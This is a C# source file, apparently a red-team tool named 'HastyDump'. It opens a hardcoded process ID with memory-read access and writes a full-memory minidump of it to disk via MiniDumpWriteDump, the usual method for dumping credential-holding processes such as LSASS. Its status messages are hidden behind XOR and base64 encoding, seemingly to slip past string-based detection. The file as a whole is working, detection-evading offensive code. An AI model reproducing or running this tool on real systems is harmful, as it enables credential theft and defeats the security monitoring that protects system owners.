using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace HastyDump
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
        {
            public ushort UniqueProcessId;
            public ushort CreatorBackTraceIndex;
            public char ObjectTypeIndex;
            public char HandleAttributes;
            public ushort HandleValue;
            public IntPtr Object;
            public ulong GrantedAccess;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct MINIDUMP_EXCEPTION_INFORMATION
        {
            public uint ThreadId;
            public IntPtr ExceptionPointers;
            public int ClientPointers;
        }

        public enum MINIDUMP_TYPE
        {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithDataSegs = 0x00000001,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpFilterMemory = 0x00000008,
            MiniDumpScanMemory = 0x00000010,
            MiniDumpWithUnloadedModules = 0x00000020,
            MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
            MiniDumpFilterModulePaths = 0x00000080,
            MiniDumpWithProcessThreadData = 0x00000100,
            MiniDumpWithPrivateReadWriteMemory = 0x00000200,
            MiniDumpWithoutOptionalData = 0x00000400,
            MiniDumpWithFullMemoryInfo = 0x00000800,
            MiniDumpWithThreadInfo = 0x00001000,
            MiniDumpWithCodeSegs = 0x00002000
        }
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }


        [DllImport("dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, Int32 ProcessId, IntPtr hFile, MINIDUMP_TYPE DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallackParam);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        // https://stackoverflow.com/questions/14971836/xor-ing-strings-in-c-sharp
        private static string encryptDecrypt(string input)
        {
            char[] key = { 'K', 'S', 'A' }; // Any chars will work, in an array of any size
            char[] output = new char[input.Length];

            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (char)(input[i] ^ key[i % key.Length]);
            }

            return new string(output);
        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        static void Main(string[] args)
        {
            string dFile = "C:\\Users\\rt\\Desktop\\HastySeries\\test.bin";
            IntPtr pHandle = IntPtr.Zero;
            bool retVal = false;
            int procId = 10856;
            FileStream fs = null;

            string encrypted = encryptDecrypt("[!] FAIL: open process handle error code: ");
            string encoded = Base64Encode(encrypted);
            Console.WriteLine("Encrypted and encoded: " + encoded);

            string decoded = Base64Decode(encoded);
            string decrypted = encryptDecrypt(decoded);
            Console.WriteLine("Decrypted: " + decrypted);

            pHandle = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryRead, false, procId);
            if (pHandle.ToInt32() == 0)
            {
                // Throws error
                Console.ForegroundColor = ConsoleColor.Red;
                // Console.WriteLine("[!] FAIL: open process handle error code: " + Marshal.GetLastWin32Error().ToString());
                Console.WriteLine(encryptDecrypt(Base64Decode("EHIcaxUAAh97azwxLj1hOyEuKDYyOHMpKj0lJzZhLiEzJCFhKDwlLmlh")) + Marshal.GetLastWin32Error().ToString());
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                // [*] SUCCESS: Obtained process handle
                Console.WriteLine(encryptDecrypt(Base64Decode("EHkcawAUCBAEGAB7axwjPzIoJTYlayMzJDAkOCBhIzIvLz8k")));
            }
            // now dump process
            if (File.Exists(dFile))
            {
                // file already is present on the system.
                Console.ForegroundColor = ConsoleColor.Red;
                // [!] FAIL: Dump file is already present on system.. cleanup or force deletion
                Console.WriteLine(encryptDecrypt(Base64Decode("EHIcaxUAAh97axc0JiNhLTotLnMoOHMgJyEkKjc4ayMzLiAkJSdhJD1hOCoyPzYsZX1hKD8kKj00O3MuOXMnJCEiLnMlLj8kPzouJQ==")));
                // open and rewrite file
                fs = new FileStream(dFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
            }
            else
            {
                fs = new FileStream(dFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write);
                Console.WriteLine("[*] SUCCESS: Creating file stream/handle: " + dFile);
            }
            using (fs)
            {
                // allow constructor+deconstructor
                retVal = MiniDumpWriteDump(pHandle, procId, fs.SafeFileHandle.DangerousGetHandle(), MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            // Cleanup
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[*] INFO: Close file handle of: " + dFile);
            fs.Close();

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[*] INFO: Close process handle of process ID: " + procId);
            Console.ReadLine();
            CloseHandle(pHandle);
        }
    }
}
